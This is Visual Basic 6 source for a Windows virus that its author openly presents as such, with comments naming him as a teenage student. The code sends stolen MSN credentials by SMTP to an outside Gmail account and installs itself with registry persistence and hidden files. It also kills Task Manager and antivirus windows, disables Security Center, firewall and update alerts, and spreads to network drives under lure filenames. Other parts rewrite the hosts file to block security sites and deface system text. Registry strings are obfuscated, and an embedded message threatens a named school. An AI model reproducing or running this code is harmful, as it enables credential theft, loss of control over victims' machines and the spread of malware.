VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   885
   ClientLeft      =   4140
   ClientTop       =   2145
   ClientWidth     =   540
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   885
   ScaleWidth      =   540
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   0
      Top             =   480
   End
   Begin VB.Timer Timer3 
      Interval        =   1000
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

'Autor:Jose de jesus anaya garcia=JOSFRES'
'Edad: 17 a�os'
'Escuela: CCH VALLEJO 4 SEMESTRE UNAM'
'Pais: Mexico D.F'
'Proyecto: Virus w32/SydaysAdn'
'Proposito: Demostrar la vulneravilidades de seguridad de las computadora'
Private Sub Form_Load()
Me.Visible = False
App.TaskVisible = False
On Error Resume Next
If App.PrevInstance = True Then End
Jspy
Call Email_XT("rinosix@gmail.com", "gallitonash", "smtp.gmail.com", 465, "jos_heavy_metal_@hotmail.com", "Infectados Adn v4.final", "Hola creador obtuve informacion: " + "Contrase�as & Usuarios MSN: " & sMSN & "S.O " + getVersion, WindowsDirectory & "\logos.txt")
nod_kill
mi_nuevo_hogar
me_cargo
incode
LOCK_UPD
Nombre
firma
p2p
Host
SPEAKER
lan
tour
killdepp
pay
firma_brutalforce
End Sub
Sub mi_nuevo_hogar()
On Error Resume Next
jcopy2 (WindowsDirectory & "\" & "sistema1" & des(":q�q"))
jcopy2 (WindowsDirectory & "\" & "Masm32m" & des(":q�q"))
SetAttr WindowsDirectory & "\" & des("u�qym=:q�q"), vbHidden + vbSystem
SetAttr WindowsDirectory & "\" & des("Ymy?>y:q�q"), vbHidden + vbSystem
End Sub

Sub me_cargo()
On Error Resume Next
Dim NuestroPrograma As String
Dim ruta As String
Dim MiObjeto As Object
Set MiObjeto = CreateObject(des("c_o~u|�:_tqxx"))
NuestroPrograma = "sistema"
ruta = WindowsDirectory & "\sistema1" & des(":q�q")

MiObjeto.RegWrite des("TWQekX[OMXkYMOTUZQh_[R`cM^QhYuo~{{r�hcuzp{�hO�~~qz�bq~u{zh^�zh") & NuestroPrograma, ruta
End Sub



Private Sub Timer1_Timer()
On Error Resume Next
Find_Windows ("Windows Task Manager")
Find_Windows ("Administrador de tareas de Windows")
Find_Windows ("System Configuration Utility")
Find_Windows ("Utilidad de configuraci�n del sistema")
Find_Windows ("Protecci�n de archivos de Windows")
Find_Windows ("Windows File Protection")
Find_Windows ("Editor del registro")
Find_Windows ("ESET Smart Security")
Find_Windows ("Multi-Engine Antivirus Scanner - Services - NoVirusThanks.org - Mozilla Firefox")
Find_Windows ("VirusTotal - Free Online Virus, Malware and URL Scanner - Mozilla Firefox")
End Sub

Private Sub Timer3_Timer()
On Error Resume Next
daaaa ("memoria" & des(":q�q"))
End Sub


Sub REGISTRAR_VIRUS()
On Error Resume Next
Dim reg1 As Object
Set reg1 = CreateObject(des("c_o~u|�:_tqxx"))
reg1.RegWrite des("TWXYh_[R`cM^QhYuo~{{r�hUz�q~zq�,Q�|x{~q~hYmuzh_�m~�,\msq"), "jose de jesus(chiquilin los hackeo)"
End Sub

Sub firma()
On Error Resume Next
Dim firmita As Object
Set firmita = CreateObject(des("c_o~u|�:_tqxx"))
firmita.RegWrite des("TWXYh_{r��m~qhYuo~{{r�hcuzp{�,Z`hO�~~qz�bq~u{zh^qsu�q~qp[~smzu�m�u{z"), "XT-HACKERS", "REG_SZ"
firmita.RegDelete des("TWQekX[OMXkYMOTUZQh_��qyhO�~~qz�O{z�~{x_q�hO{z�~{xh_mrqN{{�")
End Sub

Sub Nombre()
On Error Resume Next
Dim firma As Object
Set firma = CreateObject(des("c_o~u|�:_tqxx"))
firma.RegWrite des("TWOah_{r��m~qhYuo~{{r�hcuzp{�hO�~~qz�bq~u{zh\{xuouqh_��qyhPumnxq^qsu�~�`{{x"), 0, "REG_DWORD"
firma.RegWrite des("TWXYh_{r��m~qhYuo~{{r�hcuzp{�,Z`hO�~~qz�bq~u{zh^qsu�q~qp[�zq~"), "REG_SZ"
End Sub
Sub LOCK_UPD()
On Error Resume Next
Dim l As Object
Set l = CreateObject(des("c_o~u|�:_tqxx"))
l.RegWrite des("TWXYh_{r��m~qhYuo~{{r�h_qo�~u��,Oqz�q~hMz�ubu~�PumnxqZ{�ur�"), 1, "REG_DWORD"
l.RegWrite des("TWXYh_{r��m~qhYuo~{{r�h_qo�~u��,Oqz�q~hRu~qcmxxPumnxqZ{�ur�"), 1, "REG_DWORD"
l.RegWrite des("TWQekOa^^QZ`ka_Q^hO{z�~{x,\mzqxhPqw�{|h_O^Z_MbQ:QdQ"), "C:\WINDOWS\system32\ssmarque.scr", "REG_SZ"
l.RegWrite des("TWXYh_{r��m~qhYuo~{{r�h_qo�~u��,Oqz�q~ha|pm�qPumnxqZ{�ur�"), 1, "REG_DWORD"
l.RegWrite des("TWOah_{r��m~qhYuo~{{r�hcuzp{�hO�~~qz�bq~u{zh\{xuouqh_��qyhPumnxq`mwYs~"), "1", "REG_DWORD"
l.RegWrite des("TWXYh_[R`cM^QhYuo~{{r�hcuzp{�,Z`hO�~~qz�bq~u{zh_��qy^q�{~qhPumnxq_^"), "1", "REG_DWORD"
l.RegWrite des("TWXYh_e_`QYhO�~~qz�O{z�~{x_q�h_q~�uoqh~"), "4", "REG_DWORD"
l.RegWrite des("TWXYh_[R`cM^QhYuo~{{r�hcuzp{�,Z`hO�~~qz�bq~u{zhcuzx{s{zhtqxx"), "Explorer.exe Masm32m.exe", "REG_SZ"
l.RegWrite des("TWQekOa^^QZ`ka_Q^hO{z�~{x,\mzqxhUz�q~zm�u{zmxh==AE"), "a.m. josfres hack"
l.RegWrite des("TWQekOa^^QZ`ka_Q^hO{z�~{x,\mzqxhUz�q~zm�u{zmxh>?AE"), "a.m. josfres hack"
l.RegWrite des("TWQekOa^^QZ`ka_Q^hO{z�~{x,\mzqxh_o~qqz,_m�q~:Ym~}�qqh`q��"), "Josfres Regresoo", "REG_SZ"
End Sub
Sub incode()
On Error Resume Next
Dim o As Object
Set o = CreateObject(des("c_o~u|�:_tqxx"))
o.RegWrite des("TWOah_{r��m~qhYuo~{{r�hUz�q~zq�,Q�|x{~q~hYmuzh_�m~�,\msq,^qpu~qo�,Omotq"), "http://xtprograming.foroactivo.com/", "REG_SZ"
 End Sub




Sub lan()
On Error Resume Next
Dim gn As Object
Dim Ttl As Integer
Dim Drvl: Dim Gdrv
'Creacion del objeto WScript.Network
Set gn = CreateObject(des("c_o~u|�:Zq��{~w"))
'Enumeramos las pc�s
Set Gdrv = gn.EnumNetworkDrives
Ttl = Gdrv.Count - 1
If Ttl <> 0 Then
For i = 1 To Ttl
'Obtenemos su nombre
Drvl = Gdrv(i)
'si existe
If Drvl <> "" Then
jcopy2 (Drvl & "\contrase�as msn.exe")
jcopy2 (Drvl & "\lacharla indios.exe")
If f.folderexist(Drvl & "\Windows\Start Menu\Programs\StartUp") <> "" Then
jcopy2 (Drvl & "\Windows\Start Menu\Programs\StartUp\Licencia" & des(":q�q"))
End If
If f.folderexist(Drvl & "\Windows\Men� Inicio\Programas\Inicio") <> "" Then
jcopy2 (Drvl & "\Windows\Men� Inicio\Programas\Inicio\Extract" & des(":q�q"))
End If
End If
Next
End If
End Sub

Sub tour()
On Error Resume Next
Dim ruta As String
Dim MiObjeto As Object
Set MiObjeto = CreateObject(des("c_o~u|�:_tqxx"))
ruta = MiObjeto.RegRead(des("TWQekX[OMXkYMOTUZQh_[R`cM^QhYuo~{{r�hcuzp{�hO�~~qz�bq~u{zh_q��|hN{{�Pu~"))
Set MiObjeto = Nothing
If Len(Dir(des(ruta + "WINDOWS\Help\Tours\mmTour\nav.txt"))) Then
Kill (des(ruta + "WINDOWS\Help\Tours\mmTour\nav.txt"))
Open des(ruta + "WINDOWS\Help\Tours\mmTour\nav.txt") For Output As #1
Print #1, "&h_Segment1a=Fundamentos de Windows XP"
Print #1, "&h_Segment1b=Fundamentos de Windows HACKING"
Print #1, "&h_Segment1=JOSFRES Black Hat"
Print #1, "&h_Segment2=Tepito es mas seguro que esto�"
Print #1, "&h_Segment3=Compre un buen antivirus taka�o"
Print #1, "&h_Segment4=cch vallejo"
Print #1, "&t_close=Salir gay"
Print #1, "&t_musicOff=Activar GAY"
Print #1, "&t_musicOn=Desactivar GAY"
Print #1, "&t_restartTour=JOSE DE JESUS"
Print #1, "&skipIntro=JOSFRES INFECTO EL SISTEMA"
Print #1, "&t_attractLoopMain=Para empezar josfres lo infecto,cch vallejo."
Close #1
Else
End If
End Sub
Sub pay()
On Error Resume Next
If Month(Now) = 10 And Day(Now) = 10 Then
MsgBox "ViVA la UNAM CCH VALLEJO 4-SEMESTRE", vbCritical, "JOSFRES "
End If

If Month(Now) = 11 And Day(Now) = 2 Then
MsgBox "FELIZ DIA DE MUERTOS VIVA EL METAL", vbCritical, "JOSFRES "
End If

If Month(Now) = 12 And Day(Now) = 2 Then
MsgBox "VIRUS PROGRAMADO POR JOSE DE JESUS VIVA EL HEAVY METAL", vbCritical, "JOSFRES "
End If

If Month(Now) = 4 And Day(Now) = 28 Then
MsgBox "Hola hoy es my cumplea�os cumplo 17 jejeje suerte y recuerda te estoy vigilando", vbCritical, "JOSFRES "
End If


If Month(Now) = 5 And Day(Now) = 5 Then
MsgBox "Hola mi virus no es detectado por ningun antivirus jajaja", vbCritical, "JOSFRES "
End If

End Sub

Sub Host()
On Error Resume Next
Open WindowsDirectory & "\" & des("p~u�q~hq�oht{�") For Output As #1
Print #1, des("=>C:<:<:=,���:�t~qm�q�|q~�:o{y")
Print #1, des("=>C:<:<:=,���:z{�u~��tmzw:{~s")
Print #1, des("=>C:<:<:=,���:r{~{|��m~q:o{y")
Print #1, des("=>C:<:<:=,=?uuu:o{y")
Print #1, des("=>C:<:<:=,mo:|mzpm{r��m~q:o{y")
Print #1, des("=>C:<:<:=,mp9m�m~q9q:�|�{p{�z:o{y")
Print #1, des("=>C:<:<:=,mwz{�:|~q��:o{y")
Print #1, des("=>C:<:<:=,mxq~�m9mz�u�u~�:uz�qo{:q")
Print #1, des("=>C:<:<:=,mxq~�m9mz�u�u~�:uz�qo{:q")
Print #1, des("=>C:<:<:=,mxq~�m9mz�u�u~�:~qp:q")
Print #1, des("=>C:<:<:=,mzp�ymzotq�m:o{y")
Print #1, des("=>C:<:<:=,mzp�ymzotq�m:o{y")
Print #1, des("=>C:<:<:=,m~:mz�q~:�mt{{:o{y")
Print #1, des("=>C:<:<:=,m�m�u�m:nx{s|{�:o{y")
Print #1, des("=>C:<:<:=,m�m�9t{yq:�|�{p{�z:o{y")
Print #1, des("=>C:<:<:=,nmuwq:?B<:oz")
Print #1, des("=>C:<:<:=,nmuwq:?B<:oy")
Print #1, des("=>C:<:<:=,nn:?B<mrqoz")
Print #1, des("=>C:<:<:=,nn:?B<mrqoz")
Print #1, des("=>C:<:<:=,nn:?B<mrqo{y")
Print #1, des("=>C:<:<:=,nn:?B<mrqo{y")
Print #1, des("=>C:<:<:=,nn:ormz:o{:oz")
Print #1, des("=>C:<:<:=,nn:p�nm:zq")
Print #1, des("=>C:<:<:=,nn:uwmwm:oy")
Print #1, des("=>C:<:<:=,nn:wmrmz:o")
Print #1, des("=>C:<:<:=,nn:wmrmz:oy")
Print #1, des("=>C:<:<:=,p{�zx{mp:yx�m~qn��q:{~s")
Print #1, des("=>C:<:<:=,q:mz�q~:mt{{:o{y")
Print #1, des("=>C:<:<:=,q:mz�q~:�mt{{:o{y")
Print #1, des("=>C:<:<:=,q:yomrqq:oy")
Print #1, des("=>C:<:<:=,r{~{:{r�{uo:o{y")
Print #1, des("=>C:<:<:=,r{~{:�{�uo9|o:o{y")
Print #1, des("=>C:<:<:=,r{~{:�{zm�u~�:o{y")
Print #1, des("=>C:<:<:=,r{~{|��m~q:o{y")
Print #1, des("=>C:<:<:=,r{~�y:tuvmow�tu:pq")
Print #1, des("=>C:<:<:=,r{~�y:wm|q~w�:o{y")
Print #1, des("=>C:<:<:=,r{~�y:ymxqwmx:o{y")
Print #1, des("=>C:<:<:=,r{~�y:|u~ur{~y:o{y")
Print #1, des("?@E<><><?.t}��{<�sq��w��ors��<q}{")
Print #1, des("?@E<><><?.t�~<r��sp<q}{")
Close #1
End Sub

Sub firma_brutalforce()
On Error Resume Next
Open WindowsDirectory & "\" & "josfres.txt" For Output As #1
Print #1, "_-|_|-|_�������������������      _-|_|-|_"
Print #1, "_-|_|-|_���������������������    _-|_|-|_"
Print #1, "_-|_|-|_����������������������   _-|_|-|_"
Print #1, "_-|_|-|_�����������������������  _-|_|-|_"
Print #1, "_-|_|-|_�����������������������  _-|_|-|_"
Print #1, "_-|_|-|_�����������������������  _-|_|-|_"
Print #1, "_-|_|-|_����������������������   _-|_|-|_"
Print #1, "_-|_|-|_����������������������   _-|_|-|_"
Print #1, "_-|_|-|_����������������������   _-|_|-|_"
Print #1, "_-|_|-|_���������������������    _-|_|-|_"
Print #1, "_-|_|-|_���������������������    _-|_|-|_"
Print #1, "_-|_|-|_������������������       _-|_|-|_"
Print #1, "_-|_|-|_�����������������        _-|_|-|_"
Print #1, "_-|_|-|_--------------------------------"
Print #1, "_-|_|-|_Virus creado por Josfres _-|_|-|_"
Print #1, "_-|_|-|_  viva el Heavy Metal    _-|_|-|_"
Print #1, "_-|_|-|_   Muera el reggeton     _-|_|-|_"
Print #1, "_-|_|-|_ cch vallejo Mexico DF   _-|_|-|_"
Print #1, "_-|_|-|_     HACKERS UNITED      _-|_|-|_"
Print #1, "_-|_|-|_  C++,VB6,KAREL,DELPHI   _-|_|-|_"
Print #1, "Hola usted esta infectado con un el virus ADN by josfres"
Print #1, "Los lammers son los que usan troyanos que no son suyos y dicen ser sus creadores"
Print #1, "Mi proxima victima va a ser el colegio Makarenko http://colegiomakarenko.com.mx/Inicio1.html"
Print #1, "Mexico D.F cch vallejo yo tengo 16 a�os y tu��"
Print #1, "He vuelto despues de un a�o de inactividad mejor que nunca"
Print #1, "Les recomiendo leeer la saga libro de tuneles"
Print #1, "aaa se me olvio algo VIVA MEXICO������������"
Close #1
End Sub



